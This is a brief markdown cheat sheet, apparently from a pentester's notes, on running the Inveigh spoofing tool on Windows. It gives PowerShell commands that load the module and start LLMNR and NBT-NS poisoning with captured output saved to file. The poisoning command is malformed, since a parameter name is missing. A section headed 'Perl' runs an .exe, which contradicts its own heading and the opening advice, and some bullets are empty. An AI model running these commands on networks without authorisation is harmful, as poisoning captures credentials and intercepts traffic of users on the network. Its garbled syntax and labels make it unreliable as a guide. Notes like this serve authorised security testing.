---
tags:
  - windows
  - linux
---
> PS version is EoL. Use Perl version!

[Inveigh](https://github.com/Kevin-Robertson/Inveigh) is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.
# Example Usage
## Windows
### Powershell
```powershell
PS > Import-Module .\Inveigh.ps1
PS > (Get-Command Invoke-Inveigh).Parameters

Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
... SNIP ...
```
#### LLMNR and NBT-NS Poisoning
```powershell
PS > Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
#### Useful flags
- `-FileOutput`: Save output
- `-ConsoleOutput`: 
### Perl
```powershell
PS > .\Inveigh.exe
```
#### Useful commands
- `HELP`
- 